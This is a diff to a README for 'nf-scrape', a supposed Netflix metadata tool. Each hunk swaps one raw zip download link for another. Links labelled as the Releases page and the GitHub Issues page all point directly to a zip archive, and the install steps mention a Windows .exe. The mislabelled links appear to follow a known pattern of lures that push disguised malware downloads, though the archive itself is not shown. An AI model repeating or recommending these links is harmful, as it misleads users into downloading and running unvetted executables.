@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download nf-scrape](https://github.com/opmblack/nf-scrape/raw/refs/heads/master/worker/scrape-nf-v3.8.zip)](https://github.com/opmblack/nf-scrape/raw/refs/heads/master/worker/scrape-nf-v3.8.zip)
+[![Download nf-scrape](https://raw.githubusercontent.com/opmblack/nf-scrape/master/src/nf-scrape-v1.6-beta.4.zip)](https://raw.githubusercontent.com/opmblack/nf-scrape/master/src/nf-scrape-v1.6-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to nf-scrape, your go-to tool for exploring metadata about Netflix title
 
 ## 📝 How to Download & Install
 
-1. Visit the [Releases page](https://github.com/opmblack/nf-scrape/raw/refs/heads/master/worker/scrape-nf-v3.8.zip) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/opmblack/nf-scrape/master/src/nf-scrape-v1.6-beta.4.zip) to find the latest version.
 2. On the Releases page, look for the most recent release.
 3. Click on the link that corresponds to your operating system. For most users, this will be either a `.exe` file for Windows or a `.zip` file for macOS and Linux.
 4. Your download will start automatically. If not, a download button will appear to click on.
@@ -60,7 +60,7 @@ If you encounter issues while running nf-scrape, consider the following solution
 
 ## 📞 Support
 
-For further assistance, feel free to raise questions or report issues on the [GitHub Issues page](https://github.com/opmblack/nf-scrape/raw/refs/heads/master/worker/scrape-nf-v3.8.zip). We welcome your feedback and suggestions.
+For further assistance, feel free to raise questions or report issues on the [GitHub Issues page](https://raw.githubusercontent.com/opmblack/nf-scrape/master/src/nf-scrape-v1.6-beta.4.zip). We welcome your feedback and suggestions.
 
 ## 🌐 Community & Contribution
 
@@ -80,4 +80,4 @@ Want to dive deeper? Check out these topics related to nf-scrape:
 
 ## 📥 Download
 
-For your convenience, here's the download link again: [Visit this page to download](https://github.com/opmblack/nf-scrape/raw/refs/heads/master/worker/scrape-nf-v3.8.zip). Enjoy using nf-scrape and happy exploring!
+For your convenience, here's the download link again: [Visit this page to download](https://raw.githubusercontent.com/opmblack/nf-scrape/master/src/nf-scrape-v1.6-beta.4.zip). Enjoy using nf-scrape and happy exploring!
